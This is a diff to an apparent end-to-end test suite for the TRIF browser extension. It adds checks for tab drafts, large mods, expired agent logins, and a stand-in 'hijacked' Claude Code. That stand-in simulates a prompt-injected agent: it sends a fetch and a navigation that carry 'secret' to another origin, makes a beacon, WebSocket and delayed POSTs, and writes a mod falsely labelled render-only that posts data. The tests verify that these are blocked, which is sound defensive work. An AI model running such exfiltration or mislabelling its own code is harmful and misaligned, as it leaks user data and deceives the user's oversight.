@@ -871,6 +871,18 @@ class Scenario {
       if (ls) throw new Error('the localhost mod ran though TRIF is off there');
       await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
       await this.waitPanel('the panel to follow back to 127.0.0.1', (x) => x.site === '127.0.0.1' && !x.gate);
+      // The message box keeps a draft per tab: what's typed in one tab doesn't show up in another.
+      const typeIn = (text) => this.panel(`async (t) => { const i = document.querySelector('#input'); i.value = t; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [text]);
+      const boxText = () => this.panel(`async () => document.querySelector('#input').value`);
+      await typeIn('left in the test page');
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [other]);
+      await this.waitPanel('the panel to follow to localhost again', (x) => x.site === 'localhost');
+      if ((await boxText()) !== '') throw new Error(`the other tab's draft showed up on localhost: ${JSON.stringify(await boxText())}`);
+      await typeIn('left on localhost');
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
+      await this.waitPanel('the panel back to 127.0.0.1 again', (x) => x.site === '127.0.0.1' && !x.gate);
+      if ((await boxText()) !== 'left in the test page') throw new Error(`127.0.0.1's draft not back: ${JSON.stringify(await boxText())}`);
+      await typeIn('');
       await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/two.html`]);
       await this.waitPage('page two with the mod', (x) => x.url.endsWith('/two.html') && x.banner === 'ran');
       await this.waitPanel('the panel on page two', (x) => x.site === '127.0.0.1' && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.running));
@@ -881,6 +893,8 @@ class Scenario {
       await this.waitPage('back on the test page', (x) => x.url.includes('e2e=4') && x.banner === 'ran');
       await this.waitPanel('the panel back on 127.0.0.1', (x) => x.site === '127.0.0.1');
     });
+
+    await r.check('mods over 1 MB in all (a 1 MB mod, 0.4 MB of code) reach the page in parts; a change sends only that mod; one over 4 MB isn\'t sent, and says why', () => this.bigModsCheck());
 
     // ---- Detox Timeline (x.com/detox-timeline) against the X stand-in
     await r.check('Detox Timeline filters a saved X home timeline (fetch and XHR)', async () => {
@@ -935,6 +949,11 @@ class Scenario {
 
     await r.check('setup page: all ticked once the agent can run, then "TRIF is ready" and Try it', () => this.setupDoneCheck());
     if (this.o.browser === 'firefox') await this.restrictiveAgainCheck();
+    // (A stand-in Claude Code: only when the helper has the scratch HOME, never your real agent.)
+    if (!this.o.agent && !this.o.codex && !this.o.oss && !this.o.guidance) {
+      await r.check('an expired login (a stand-in Claude Code): the login notice and one plain line, not the raw error; the message back in the box', () => this.expiredLoginCheck(win));
+      await r.check('a hijacked agent (a stand-in Claude Code): the tab it ran code in sends nothing that changes anything until it reloads, even later; its mod that posts is held by its code, whatever its header says', () => this.hijackedAgentCheck(win));
+    }
 
     if (this.o.agent) await this.agentChecks('claude');
     if (this.o.codex) await this.agentChecks('codex');
@@ -1055,7 +1074,8 @@ class Scenario {
     await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
     await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.win.tabId, `${base}/promos.html`]);
     await sleep(1500);
-    const sweep = async (...args) => (await this.cli(['sweep', '--url', 'promos.html', '--scroll', ...args], { json: true })).json;
+    // (--force: it's the tab in front, and sweep --scroll won't scroll that one otherwise)
+    const sweep = async (...args) => (await this.cli(['sweep', '--url', 'promos.html', '--scroll', '--force', ...args], { json: true })).json;
     // Ground truth after a run: visible "Promoted" labels (lazy ones loaded by scrolling), visible posts,
     // visible elements still using the blue.
     const measure = async () => {
@@ -1581,6 +1601,223 @@ class Scenario {
     });
   }
 
+  // ---- an expired login, with a stand-in Claude Code (sidepanel.js loginLine, runs.js loginFailed)
+
+  /**
+   * A stand-in `claude` first on the helper's PATH (config.json env.PATH) that says it's logged in (as Claude
+   * Code's `auth status` does with an expired login) and answers every run the way Claude Code 2.1.319 does
+   * when its login can't be refreshed. It reaches nothing. Put back after.
+   */
+  async expiredLoginCheck(win) {
+    const dir = path.join(this.work, 'standin');
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
+const a = process.argv.slice(2);
+if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
+if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
+const t = 'Failed to authenticate: OAuth session expired and could not be refreshed';
+const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
+say({ type: 'system', subtype: 'init', session_id: 'e2e-expired' });
+say({ type: 'assistant', message: { model: '<synthetic>', content: [{ type: 'text', text: t }] }, error: 'authentication_failed' });
+say({ type: 'result', subtype: 'success', is_error: true, result: t, session_id: 'e2e-expired' });
+process.exitCode = 1;
+`, { mode: 0o755 });
+    const cfgFile = path.join(this.priv, 'config.json');
+    const saved = fs.readFileSync(cfgFile, 'utf8');
+    const cfg = JSON.parse(saved);
+    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
+    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
+    const site = '127.0.0.1';
+    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
+    // The panel asks for the agents when it opens: open it again so it sees the stand-in.
+    const reopen = async () => {
+      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
+      await sleep(800);
+      this.panelCtx = await this.d.findPage('sidepanel.html');
+    };
+    try {
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
+      // (The test window's own tab: x.com's is gone by now.)
+      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `http://${site}:${this.o.servers.port}/?e2e=expired`]);
+      await reopen();
+      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
+      await this.waitLooks('Claude Code ready (the stand-in)', (l) => l.dotLabel === 'Ready · Claude Code' && !l.send.disabled, 30000);
+      const message = 'hide the banner please';
+      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [message]);
+      await this.d.click(this.panelCtx, '#send');
+      const c = await waitFor('the run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 30000, intervalMs: 300 });
+      const roles = c.messages.map((m) => [m.role, m.text]);
+      if (JSON.stringify(roles) !== JSON.stringify([['user', message], ['login', 'Claude Code needs you to log in again.']])) throw new Error(`the chat: ${JSON.stringify(roles)}`);
+      const x = await this.waitLooks('the login notice', (l) => l.classes.join() === 'needs-login' && l.notices.some((t) => /isn’t logged in/.test(t)), 20000);
+      const shown = await waitFor('the message back in the box', () => this.panel(`async () => {
+        const msgs = [...document.querySelectorAll('#messages > li')].map((li) => [li.className, li.innerText.trim()]);
+        const input = document.getElementById('input').value;
+        return input ? { msgs, input } : null;
+      }`), { timeoutMs: 10000 });
+      if (shown.input !== message) throw new Error(`the box has "${shown.input}"`);
+      if (shown.msgs.some(([cls, text]) => /error|assistant/.test(cls) || /OAuth/.test(text))) throw new Error(`the chat shows: ${JSON.stringify(shown.msgs)}`);
+      if (!shown.msgs.some(([cls, text]) => cls === 'msg login' && text === 'Claude Code needs you to log in again.')) throw new Error(`no login line: ${JSON.stringify(shown.msgs)}`);
+      // Its own check still says logged in, so after logging in from a terminal, sending is how to tell.
+      if (x.send.disabled) throw new Error(`Send is off: ${JSON.stringify(x.send)}`);
+      await this.shot(this.panelCtx, 'panel-login-expired');
+      // From a terminal: the plain message, and how to log in.
+      const t = await this.cli(['agent', 'run', '--url', `http://${site}:${this.o.servers.port}/`, 'hi from a terminal'], { timeoutMs: 60000 });
+      if (t.status !== 1 || !t.stderr.includes('error: Claude Code needs you to log in again. Run `trif agent login --agent claude`') || /OAuth/.test(t.stdout + t.stderr)) {
+        throw new Error(`trif agent run: ${t.status} ${t.stderr} ${t.stdout}`);
+      }
+      return `"${x.notices.find((n) => /logged in/.test(n))}"; chat: ${roles.map((m) => m[0]).join(', ')}; the box: "${shown.input}"`;
+    } finally {
+      fs.writeFileSync(cfgFile, saved);
+      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
+    }
+  }
+
+  // ---- a hijacked agent, with a stand-in Claude Code (extension/tablock.js, helper/lib/powers.js and held.js)
+
+  /**
+   * A stand-in `claude` that does what an agent steered by a web page might: from `trif run` in the tab it
+   * was given, a POST, a beacon, a WebSocket, a POST put off until after its command is over, and a
+   * plain GET (reading is fine); then a mod whose header says render-only but whose code posts. The test
+   * site must receive none of the writes, the GET must work, the panel must say the tab is locked, the mod
+   * must be held for what its code does; a reload unlocks the tab, and a terminal's `trif run` (the
+   * user's own) doesn't lock it.
+   */
+  async hijackedAgentCheck(win) {
+    const dir = path.join(this.work, 'standin-hijack');
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
+const { spawnSync } = require('child_process');
+const fs = require('fs');
+const a = process.argv.slice(2);
+if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
+if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
+const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
+say({ type: 'system', subtype: 'init', session_id: 'e2e-hijack' });
+process.on('uncaughtException', (e) => { const t = 'stand-in crashed: ' + (e && e.stack || e) + ' cwd=' + process.cwd(); say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text: JSON.stringify({ crash: t }) }] } }); say({ type: 'result', subtype: 'success', is_error: false, result: JSON.stringify({ crash: t }), session_id: 'e2e-hijack' }); process.exit(0); });
+const ctxFile = a[a.indexOf('--append-system-prompt-file') + 1];
+const ctx = a.includes('--append-system-prompt-file') ? fs.readFileSync(ctxFile, 'utf8') : a.join(' ');
+const tab = (/\\(tab (\\d+)\\)/.exec(ctx) || [])[1];
+const own = require('path').join(process.cwd(), 'bin', 'trif'); // (the workspace's, as the run's cwd is the workspace)
+const trif = fs.existsSync(own) ? own : 'trif';
+const run = (code) => {
+  const r = spawnSync(trif, ['run', '--tab', tab, '--timeout', '8000', code], { encoding: 'utf8' });
+  if (r.error) return 'trif failed: ' + r.error.message;
+  if (r.status !== 0) return 'trif failed: ' + String(r.stderr || r.stdout || '').trim();
+  try { return JSON.parse(r.stdout); } catch { return r.stdout.trim(); } // (a string result prints as it is)
+};
+const out = { tab };
+out.post = run('fetch("/e2e-post", { method: "POST", body: "hi" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
+out.get = run('fetch("/two.html").then((r) => r.status, (e) => "failed: " + e.message)');
+out.leak = run('fetch("http://localhost:" + location.port + "/e2e-leak?d=secret").then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
+out.beacon = run('navigator.sendBeacon("/e2e-beacon", "hi")');
+out.socket = run('new Promise((res) => { const w = new WebSocket("ws://" + location.host + "/e2e-socket"); w.onopen = () => res("open"); w.onerror = () => res("blocked"); setTimeout(() => res("no answer"), 3000); })');
+out.later = run('(setTimeout(() => fetch("/e2e-later", { method: "POST", body: "after the command" }), 1500), "put off")');
+fs.writeFileSync('sites/127.0.0.1/e2e-poster.js', '// ==WebMod==\\n// @name Prettier\\n// @description Makes the page prettier\\n// @risk 0 render-only\\n// ==/WebMod==\\n(() => { fetch("/e2e-from-mod", { method: "POST" }); })();\\n');
+const text = JSON.stringify(out);
+say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text }] } });
+say({ type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'e2e-hijack' });
+`, { mode: 0o755 });
+    const cfgFile = path.join(this.priv, 'config.json');
+    const saved = fs.readFileSync(cfgFile, 'utf8');
+    const cfg = JSON.parse(saved);
+    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
+    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
+    const site = '127.0.0.1';
+    const base = `http://${site}:${this.o.servers.port}`;
+    const posted = (p) => this.o.servers.requests.filter((q) => q.url.startsWith(p) && q.method !== 'GET');
+    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
+    const reopen = async () => {
+      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
+      await sleep(800);
+      this.panelCtx = await this.d.findPage('sidepanel.html');
+    };
+    const modFile = path.join(this.trif, 'sites', site, 'e2e-poster.js');
+    this.hijacked = true; // (the console check expects the requests this blocks)
+    try {
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
+      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=hijack`]);
+      await reopen();
+      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
+      // (After the expired-login check the panel may still say Claude Code needs a login; Send works anyway.)
+      await this.waitLooks('Send on (the stand-in Claude Code)', (l) => /Claude Code/.test(l.dotLabel) && !l.send.disabled, 30000);
+      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, ['make the page prettier']);
+      await this.d.click(this.panelCtx, '#send');
+      const c = await waitFor('the run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 60000, intervalMs: 300 });
+      const answer = c.messages.find((m) => m.role === 'assistant');
+      if (!answer) throw new Error(`the run: ${JSON.stringify(c.messages.map((m) => [m.role, String(m.text).slice(0, 400)]))}`);
+      const said = JSON.parse(answer.text);
+      if (said.crash) throw new Error(said.crash);
+      if (String(said.tab) !== String(win.tabId)) throw new Error(`the stand-in got tab ${said.tab}, not ${win.tabId}: ${JSON.stringify(said)}`);
+      if (!/^blocked/.test(said.post)) throw new Error(`the POST: ${said.post}`);
+      if (said.get !== 200) throw new Error(`a GET should still work: ${said.get}`);
+      if (!/^blocked/.test(said.leak)) throw new Error(`the GET to another site: ${said.leak}`);
+      if (said.socket === 'open') throw new Error('the WebSocket opened');
+      if (said.later !== 'put off') throw new Error(`the put-off POST: ${said.later}`);
+      await sleep(3000); // (past the put-off POST's 1.5 s)
+      for (const p of ['/e2e-post', '/e2e-beacon', '/e2e-later', '/e2e-from-mod']) if (posted(p).length) throw new Error(`the test site received ${JSON.stringify(posted(p))}`);
+      const leaked = () => this.o.servers.requests.filter((q) => /^\/e2e-(leak|nav)/.test(q.url));
+      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
+      if (this.o.servers.requests.some((q) => q.url.startsWith('/e2e-socket'))) throw new Error('the WebSocket reached the test site');
+      // The panel says so, with a Reload button
+      const lock = await waitFor('the lock notice', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? n.innerText : null; }`), { timeoutMs: 10000 });
+      if (!/Posting is paused on this tab/.test(lock)) throw new Error(`the lock notice: ${lock}`);
+      // The mod: held for what its code does, its header's claim shown apart
+      const held = await waitFor('the mod held', () => this.panel(`async () => {
+        const li = document.querySelector('#mod-list li[data-mod="${site}/e2e-poster"]');
+        const box = li && li.querySelector('.mod-facts.held');
+        return box ? { facts: [...box.querySelectorAll('ul.facts li')].map((x) => x.textContent), claim: box.querySelector('.facts-claim')?.textContent || '' } : null;
+      }`), { timeoutMs: 15000 });
+      if (!held.facts.some((f) => /send requests or messages from the page as you \(it uses fetch\)/.test(f))) throw new Error(`the held facts: ${JSON.stringify(held)}`);
+      if (!/The agent says: .render-only/.test(held.claim)) throw new Error(`the claim: ${held.claim}`);
+      await this.shot(this.panelCtx, 'panel-hijack-held-and-locked');
+      // Code left in the locked page sending the tab to another site with what it read: blocked (the
+      // tab shows the browser's blocked page); the panel's button takes it back to the page it was
+      // locked on, a new page: unlocked
+      const away = await this.cli(['run', '--tab', String(win.tabId), '(setTimeout(() => { location.href = "http://localhost:" + location.port + "/e2e-nav?d=secret"; }, 100), "sending it away")'], { timeoutMs: 30000 });
+      if (away.status !== 0) throw new Error(`trif run: ${away.stderr}`);
+      await sleep(2500);
+      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
+      await waitFor('the lock notice still up', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden || null; }`), { timeoutMs: 10000 });
+      await this.panel(`async () => { document.querySelector('#tab-lock button').click(); return true; }`);
+      await waitFor('the tab back on the test site', async () => {
+        const t = await this.ext(`async (id) => (await chrome.tabs.get(id)).url`, [win.tabId]);
+        return t && t.startsWith(base) ? t : null;
+      }, { timeoutMs: 15000 });
+      await waitFor('the tab unlocked', () => this.panel(`async () => document.getElementById('tab-lock').hidden || null`), { timeoutMs: 15000 });
+      const t = await this.cli(['run', '--tab', String(win.tabId), 'fetch("/e2e-after", { method: "POST", body: "x" }).then((r) => r.status)'], { timeoutMs: 30000 });
+      if (t.status !== 0) throw new Error(`trif run from a terminal: ${t.stderr}`);
+      await waitFor('the terminal POST to arrive', () => posted('/e2e-after').length || null, { timeoutMs: 5000 });
+      if (!(await this.panel(`async () => document.getElementById('tab-lock').hidden`))) throw new Error('a terminal trif run locked the tab');
+      // A mod from outside any run (pasted into the folder, as a shared mod would be) that posts: held
+      // too, until the user's `trif approve`; then it runs
+      const pasted = path.join(this.trif, 'sites', site, 'e2e-pasted.js');
+      fs.writeFileSync(pasted, '// ==WebMod==\n// @name Pasted\n// @risk 0 render-only\n// ==/WebMod==\n(() => { document.documentElement.dataset.e2ePasted = "ran"; fetch("/e2e-pasted", { method: "POST" }); })();\n');
+      const pastedHeld = await waitFor('the pasted mod held', async () => {
+        const st = await this.cli(['status'], { timeoutMs: 20000 });
+        return /127\.0\.0\.1\/e2e-pasted\s+HELD: it can send requests/.test(st.stdout) ? st.stdout.split('\n').find((l) => l.includes('e2e-pasted')).trim() : null;
+      }, { timeoutMs: 15000, intervalMs: 500 });
+      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
+      const ranHeld = await this.cli(['run', '--tab', String(win.tabId), 'document.documentElement.dataset.e2ePasted || "not run"'], { timeoutMs: 20000 });
+      if (ranHeld.stdout.trim() !== 'not run' || posted('/e2e-pasted').length) throw new Error(`the held mod ran: ${ranHeld.stdout}`);
+      const ok = await this.cli(['approve', `${site}/e2e-pasted`], { timeoutMs: 20000 });
+      if (ok.status !== 0) throw new Error(`trif approve: ${ok.stderr}`);
+      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
+      await waitFor('the approved mod to run', async () => {
+        const r2 = await this.cli(['run', '--tab', String(win.tabId), 'document.documentElement.dataset.e2ePasted || "not run"'], { timeoutMs: 20000 });
+        return r2.stdout.trim() === 'ran' || null;
+      }, { timeoutMs: 15000, intervalMs: 500 });
+      await waitFor('its POST to arrive', () => posted('/e2e-pasted').length || null, { timeoutMs: 5000 });
+      fs.unlinkSync(pasted);
+      return `POST ${said.post}; GET ${said.get}; GET to another site ${said.leak}; beacon/later/socket/leaving for another site never arrived; mod held: ${held.facts.join(' / ')}; the panel's button brought the tab back, unlocked; a pasted mod that posts: "${pastedHeld}", ran once approved`;
+    } finally {
+      fs.writeFileSync(cfgFile, saved);
+      for (const f of [modFile, path.join(this.trif, 'sites', site, 'e2e-pasted.js')]) { try { fs.unlinkSync(f); } catch { /* not written */ } }
+      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
+    }
+  }
+
   // ---- agent runs (real ones: they use your Claude Code / Codex login and cost a little)
 
   async agentChecks(agent) {
@@ -1728,7 +1965,10 @@ class Scenario {
     // The helper stopped and user scripts turned off on purpose (colourChecks): the background's warnings
     // about either are expected.
     const expected = (p) => p.level === 'warn' && ((this.helperStopped && /helper disconnected|native messaging host/i.test(String(p.text)))
-      || (this.scriptsRevoked && /user scripts were turned off/.test(String(p.text))));
+      || (this.scriptsRevoked && /user scripts were turned off/.test(String(p.text))))
+      // the hijacked agent's requests, which the tab lock blocked on purpose (hijackedAgentCheck)
+      // (Firefox doesn't say which page: after that check, a failed fetch or socket is one of those)
+      || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket|e2e-leak|e2e-nav|blocked by|CORS/i.test(String(p.text) + String(p.source || '')));
     const problems = (await this.d.consoleProblems()).filter((p) => !expected(p));
     // The agent-made mod and the stand-in pages aren't ours to judge; everything else counts.
     const lines = problems.map((p) => `${p.level} [${p.from}] ${String(p.text).slice(0, 300)}${p.source ? ` (${String(p.source).slice(0, 120)})` : ''}`);
@@ -1739,6 +1979,82 @@ class Scenario {
     return 'none';
   }
 
+  /**
+   * A set just over the 1 MB one native message can carry in Chrome and Firefox: a 1 MB mod (a base64
+   * string, like a mod with a sound in it) and 0.4 MB of functions, on the test site, which is on. It goes
+   * in parts and runs; a change to the small one goes without the big one's code (modsSame) and the big one
+   * still runs; a mod over the 4 MB cap isn't sent and `trif status` and `trif doctor` say why; removed, they
+   * go. This stays small on purpose (a 48 MB set once took headless Firefox to 7.4 GB and the Mac ran out of
+   * memory): tests/e2e/measure-big-mods.js measures sets up to the 16 MB cap, separately.
+   */
+  async bigModsCheck() {
+    const dir = path.join(this.trif, 'sites', '127.0.0.1');
+    const log = path.join(this.priv, 'helper.log');
+    const size = () => fs.statSync(log).size;
+    const since = (at) => { const b = fs.readFileSync(log); return b.subarray(at).toString('utf8'); };
+    const BIG = 1024 * 1024;
+    const bigMod = (tag) => {
+      const d = crypto.randomBytes(BIG * 3 / 4).toString('base64');
+      return `// ==WebMod==\n// @name E2E Big\n// ==/WebMod==\nconst d = "${d}";\ndocument.documentElement.dataset.trifE2eBig = "${tag}:" + d.length;\n`;
+    };
+    const fns = [];
+    for (let i = 0, n = 0; n < 0.4 * 1024 * 1024; i++) { const f = `function f${i}(a) { const x = a * ${i} + ${i % 13}; return x % 7 === 3 ? String(x) + "${crypto.randomBytes(12).toString('hex')}" : x; }\n`; fns.push(f); n += f.length; }
+    const codeMod = (tag) => `// ==WebMod==\n// @name E2E Code\n// ==/WebMod==\n${fns.join('')}let s = 0;\n${fns.map((_, i) => `s += String(f${i}(${i})).length;`).join('\n')}\ndocument.documentElement.dataset.trifE2eCode = "${tag}:" + s;\n`;
+    const want = String(fns.reduce((n, f, i) => n + String(new Function(`${f}; return f${i}(${i});`)()).length, 0));
+    const state = () => this.page(`async () => ({ big: document.documentElement.dataset.trifE2eBig || null, code: document.documentElement.dataset.trifE2eCode || null, huge: document.documentElement.dataset.trifE2eHuge || null, banner: document.documentElement.dataset.trifE2e || null, nav: Math.round(performance.getEntriesByType('navigation')[0]?.domContentLoadedEventEnd || 0) })`);
+    const SENT = /sent (\d+) mod\(s\) to the extension(?: \(\d+ held\))?(?: \((\d+) it has already, without their code\))?, (\d+) KB(?: in (\d+) parts)?/;
+    // From the write to the extension's modsApplied (its "registered" line in the helper's log).
+    const delivered = async (what, write, pred) => {
+      const at = size();
+      const t0 = Date.now();
+      write();
+      const text = await waitFor(`the helper to send ${what} and the extension to apply it`, () => {
+        const t = since(at);
+        const sent = SENT.exec(t);
+        return sent && pred({ same: Number(sent[2] || 0), kb: Number(sent[3]), parts: Number(sent[4] || 0) }) && /extension registered \d+ mod\(s\)/.test(t.slice(sent.index)) ? t : null;
+      }, { timeoutMs: 30000, intervalMs: 50 });
+      const sent = SENT.exec(text);
+      return { ms: Date.now() - t0, same: Number(sent[2] || 0), kb: Number(sent[3]), parts: Number(sent[4] || 0) };
+    };
+    const reload = async (pred) => {
+      await this.ext(`async (id) => { await chrome.tabs.reload(id); }`, [this.win.tabId]);
+      return waitFor('the test page with the big mods', async () => {
+        this.pageCtx = await this.d.findPage((u) => u.startsWith(this.pageUrlPrefix), { timeoutMs: 5000 });
+        const s = await state();
+        return pred(s) ? s : null;
+      }, { timeoutMs: 30000 });
+    };
+    const files = ['e2e-big.js', 'e2e-code.js', 'e2e-huge.js'].map((f) => path.join(dir, f));
+    try {
+      const first = await delivered('the big set', () => { fs.writeFileSync(files[0], bigMod('v1')); fs.writeFileSync(files[1], codeMod('v1')); }, (m) => m.parts > 1);
+      const p1 = await reload((s) => s.big === `v1:${BIG}` && s.code === `v1:${want}` && s.banner === 'ran');
+      // A change to the small one: the big one goes without its code, and still runs.
+      const change = await delivered('the changed set', () => fs.writeFileSync(files[1], codeMod('v2')), (m) => m.same >= 1);
+      if (change.parts || change.kb > 1024) throw new Error(`a change to the 0.4 MB mod sent ${change.kb} KB${change.parts ? ` in ${change.parts} parts` : ''}`);
+      await reload((s) => s.big === `v1:${BIG}` && s.code === `v2:${want}`);
+      // Over the cap: not sent, and said why.
+      fs.writeFileSync(files[2], `// ==WebMod==\n// @name E2E Huge\n// ==/WebMod==\n/*${'x'.repeat(4 * 1024 * 1024)}*/\ndocument.documentElement.dataset.trifE2eHuge = "ran";\n`);
+      const huge = await waitFor('trif status to say the huge mod was not sent', async () => {
+        const st = (await this.cli(['status'], { json: true })).json;
+        return (st?.helper?.modErrors || []).find((e) => e.id === '127.0.0.1/e2e-huge') || null;
+      }, { timeoutMs: 15000 });
+      if (huge.limit !== 'mod' || !/a mod can be up to 4 MB/.test(huge.error)) throw new Error(`huge: ${JSON.stringify(huge)}`);
+      const doc = (await this.cli(['doctor'], { json: true, timeoutMs: 60000 })).json;
+      const check = (doc?.checks || []).find((c) => /e2e-huge/.test(c.title));
+      if (!check || check.status !== 'fail' || !/keep sounds, pictures/.test(check.fix || '')) throw new Error(`trif doctor: ${JSON.stringify(check)}`);
+      const p2 = await reload((s) => s.big === `v1:${BIG}` && s.code === `v2:${want}`);
+      if (p2.huge) throw new Error('the mod over the cap ran');
+      const status = (await this.cli(['status'], { json: true })).json;
+      const errs = [...((status?.helper?.modErrors || []).filter((e) => e.id !== '127.0.0.1/e2e-huge')), ...((status?.helper?.modsApplied || {}).errors || [])].filter((e) => /e2e-(big|code)/.test(e.id));
+      if (errs.length) throw new Error(`errors: ${JSON.stringify(errs).slice(0, 300)}`);
+      const gone = await delivered('the set without them', () => files.forEach((f) => fs.rmSync(f, { force: true })), (m) => !m.parts);
+      await reload((s) => !s.big && !s.code && s.banner === 'ran');
+      return `${first.kb} KB in ${first.parts} parts, applied ${first.ms} ms after the write, page DOMContentLoaded ${p1.nav} ms; a change to the small mod: ${change.kb} KB (${change.same} sent without code), ${change.ms} ms; over 4 MB: not sent ("${huge.error.slice(0, 60)}…"); removed: ${gone.ms} ms`;
+    } finally {
+      for (const f of files) fs.rmSync(f, { force: true });
+    }
+  }
+
   async helperLogCheck() {
     const file = path.join(this.priv, 'helper.log');
     if (!fs.existsSync(file)) return { status: 'skip', detail: 'no helper.log' };
@@ -1746,7 +2062,9 @@ class Scenario {
     fs.copyFileSync(file, this.r.file(`${this.label}-helper.log`));
     // Before the harness allows user scripts, every sync logs that each mod couldn't register: expected.
     const expected = (l) => /User scripts aren't allowed for TRIF|User scripts are off for TRIF/.test(l) // Firefox's wording, Chrome's
-      || (this.scriptsRevoked && /user scripts were turned off/.test(l)); // colourChecks turned them off
+      || (this.scriptsRevoked && /user scripts were turned off/.test(l)) // colourChecks turned them off
+      || /mod 127\.0\.0\.1\/e2e-huge: mod is [\d.]+ MB; a mod can be up to 4 MB/.test(l) // bigModsCheck's, over the cap on purpose
+      || /WARN stdout error \(EPIPE\); \w+ went away/.test(l); // (the harness quit the browser while the helper was writing to it)
     const skipped = lines.filter(expected).length;
     const bad = lines.filter((l) => !expected(l) && /\b(WARN|ERROR|warn|error)\b/.test(l.slice(0, 60)));
     const errors = bad.filter((l) => /\bERROR\b|\berror\b/.test(l.slice(0, 60)));
